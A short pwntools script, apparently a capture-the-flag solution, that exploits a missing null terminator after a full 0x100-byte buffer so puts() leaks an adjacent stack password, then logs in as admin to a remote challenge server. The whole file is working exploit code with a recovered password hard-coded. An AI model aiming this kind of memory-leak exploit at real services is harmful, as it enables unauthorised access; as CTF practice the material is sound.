from pwn import *

r = remote('node5.buuoj.cn', 25158)

# puts函数进行输出时，如puts(buf)，buf大小时0x20，如果buf已被写满，那么puts函数无法在buf后加上\x00，函数不会被截断，会把栈上buf之后的内容继续输出
# 本题的s_1的位置为rbp-0x154, 保存密码的s位置为rbp-0x54，两者相差0x100，刚好是填满s_1的大小
payload = b'A' * 0x100
# r.sendlineafter(b'name?', payload)
# r.recvline()
# print(r.recvline())  # a_reAllY_s3cuRe_p4s$word_f85406

password = 'a_reAllY_s3cuRe_p4s$word_f85406'
r.sendlineafter(b'name?', b'admin')
r.sendlineafter(b'Password.', password)
r.recvline()
print(r.recvline())
